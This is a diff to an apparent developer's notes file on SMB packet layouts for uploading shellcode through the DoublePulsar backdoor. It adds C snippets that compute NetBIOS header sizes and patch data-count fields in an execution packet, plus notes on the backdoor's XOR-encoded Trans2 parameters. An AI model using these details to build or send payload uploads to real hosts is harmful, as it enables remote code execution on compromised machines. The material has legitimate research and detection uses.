@@ -1,36 +1,42 @@
-July 26 2020 update:
-DoublePulsar backdoor upload packet information
+/////////////////////////////////////////////////////////////////////////////////////
+NetBIOS information is 4 bytes in length
 
-Sources:
-https://www.microsoft.com/security/blog/2017/06/30/exploring-the-crypt-analysis-of-the-wannacrypt-ransomware-smb-exploit-propagation/
-https://shasaurabh.blogspot.com/2017/05/doublepulsar-backdoor.html
+#pragma pack(1)
+//struct __attribute__((__packed__)) net_bios
+typedef struct
+{
+	uint16_t type;
+	uint16_t length;
+} net_bios;
+#pragma pop
 
-Trans2.SESSION_SETUP.Parameters information:
+The length field contains the size of the SMB packet in big endian format.
+Everything else in the SMB packet is in little endian format
 
-The data is 12 bytes long—the first four bytes indicate total length
-the next four bytes is reserved, and the last 4 bytes are the current offsets of the payload bytes in little-endian. 
-These fields are encoded with master XOR key
-Because the reserved field is supposed to be 0, the reserved field is actually the same as the master XOR key. 
-Going back to the packet capture above, the reserved field value is 0x38a9dbb6, which is the master XOR key. 
-The total length is encoded as 0x38f9b8be. When this length is XORed with the master XOR key, it is 0x506308
-which is the actual length of the payload bytes being uploaded. 
-The last field is 0x38b09bb6. When XORed with the master key, this last field becomes 0, 
-meaning this packet is the first packet of the payload upload.
+This was a major confusing factor.  If a packet containing the:
+NetBios Header + SMB Header + Trans2 header + 12 Byte parameters + Payload length of 4096
 
-Trans2.SESSION_SETUP.Parameters is of 0xC (12) bytes and contains below information encrypted by XOR key.
-1. Total Size of Payload
-2. Chunk Size
-3. Offset of Chunk in Payload
+This max sized packet would equal 4178 bytes in total size in memory.  HOWEVER, in the NetBIOS header
+the NetBIOS header does NOT contain the size of itself and just the size of the rest of the packet at that point.
 
-Trans2.SESSION_SETUP.Parameters value = 6a620858 62015858 62115858
-Total Size of Payload = (0x5808626a) ^ (0x58581162) = 0x507308
- Chunk Size = (0x58580162) ^ (0x58581162) = 0x1000(4096)
-Offset of Chunk in Payload = (0x58581162) ^ (0x58581162) = 0
+So a NetBIOS header would say 4174 bytes in length if the packet has a total size of 4178.
 
-Another example of Trans2.SESSION_SETUP.Parameters value = 6a620858 62015858 62015858
-Total Size of Payload = (0x5808626a) ^ (0x58581162) = 0x507308
-Chunk Size = (0x58580162) ^ (0x58580162) = 0x1000(4096)
-Offset of Chunk in Payload = (0x58580162) ^ (0x58581162) = 0x1000(4096)
+When calculating the value to place into the NetBIOS header.
+Calculate it this way and remember to use htons to flip it to big endian format which is what NetBIOS requires.
+Do not use a little endian format for the NetBIOS header.
+
+//calculate the size
+unsigned short NetBios_Header_Size = htons(EntireShellcodeSize + 12 + 70 - 4);
+
+//The calculation occurs as follows: EntireShellcode size could be: 4096
+//12 for the parameters
+//70 is the size of the Execution skeleton packet which ALREADY contains a NetBIOS header size of 4
+//So the Execution Packet skeleton ( size of 70 bytes ) already contains 4 bytes of a NetBIOS header
+and is truly only 66 bytes in length without the NetBIOS header.
+
+//place the value of NetBios_Header_Size in the SMB packet and edit the previous value
+memcpy((unsigned char*)Your_SMB_Packet + 2, (char*)&NetBios_Header_Size, 2);
+
 
 
 /////////////////////////////////////////////////////////////////////////////////////
@@ -60,6 +66,24 @@ tree_id      [28] [29]
 process_id   [30] [31]
 user_id      [32] [33]
 multiplex_id [34] [35]
+
+////////////////////////////////////////////////
+Other values that were required by Doublepulsar
+
+//patch other values
+unsigned short TotalDataCount = EntireShellcodeSize;
+unsigned short DataCount = EntireShellcodeSize;
+unsigned short byteCount = EntireShellcodeSize + 13;
+
+//Use first method
+*(WORD*)(Doublepulsar_Execution_Packet + 0x27) = TotalDataCount;
+*(WORD*)(Doublepulsar_Execution_Packet + 0x3b) = DataCount;
+*(WORD*)(Doublepulsar_Execution_Packet + 0x43) = byteCount;
+
+//Use second method
+memcpy((unsigned char*)Doublepulsar_Execution_Packet + 0x27, (char*)&TotalDataCount, 2);
+memcpy((unsigned char*)Doublepulsar_Execution_Packet + 0x3b, (char*)&DataCount, 2);
+memcpy((unsigned char*)Doublepulsar_Execution_Packet + 0x43, (char*)&byteCount, 2);
 
 ////////////////////////////////////////////////
 UserID position in SMB response is [32] and [33]
@@ -107,6 +131,15 @@ Echo Request:                                     0x2b
 #define TREECONNETANDX		0x75
 #define NTCREATEANDX		0xa2
 
+/*
+You must pack this structure
+
+Use #pragma pack(1) and #pragma pop
+
+or typedef struct __attribute__((__packed__)) 
+if you are on Linux
+
+*/
 typedef struct {
 	uint16 SmbMessageType; //0x00
 	uint16 SmbMessageLength; 
@@ -232,3 +265,38 @@ typedef struct {
 	uint32 LastWrite;
 	uint16 ByteCount;
 } CLOSE;
+
+
+July 26 2020 update:
+DoublePulsar backdoor upload packet information
+
+Sources:
+https://www.microsoft.com/security/blog/2017/06/30/exploring-the-crypt-analysis-of-the-wannacrypt-ransomware-smb-exploit-propagation/
+https://shasaurabh.blogspot.com/2017/05/doublepulsar-backdoor.html
+
+Trans2.SESSION_SETUP.Parameters information:
+
+The data is 12 bytes long—the first four bytes indicate total length
+the next four bytes is reserved, and the last 4 bytes are the current offsets of the payload bytes in little-endian. 
+These fields are encoded with master XOR key
+Because the reserved field is supposed to be 0, the reserved field is actually the same as the master XOR key. 
+Going back to the packet capture above, the reserved field value is 0x38a9dbb6, which is the master XOR key. 
+The total length is encoded as 0x38f9b8be. When this length is XORed with the master XOR key, it is 0x506308
+which is the actual length of the payload bytes being uploaded. 
+The last field is 0x38b09bb6. When XORed with the master key, this last field becomes 0, 
+meaning this packet is the first packet of the payload upload.
+
+Trans2.SESSION_SETUP.Parameters is of 0xC (12) bytes and contains below information encrypted by XOR key.
+1. Total Size of Payload
+2. Chunk Size
+3. Offset of Chunk in Payload
+
+Trans2.SESSION_SETUP.Parameters value = 6a620858 62015858 62115858
+Total Size of Payload = (0x5808626a) ^ (0x58581162) = 0x507308
+ Chunk Size = (0x58580162) ^ (0x58581162) = 0x1000(4096)
+Offset of Chunk in Payload = (0x58581162) ^ (0x58581162) = 0
+
+Another example of Trans2.SESSION_SETUP.Parameters value = 6a620858 62015858 62015858
+Total Size of Payload = (0x5808626a) ^ (0x58581162) = 0x507308
+Chunk Size = (0x58580162) ^ (0x58580162) = 0x1000(4096)
+Offset of Chunk in Payload = (0x58580162) ^ (0x58581162) = 0x1000(4096)
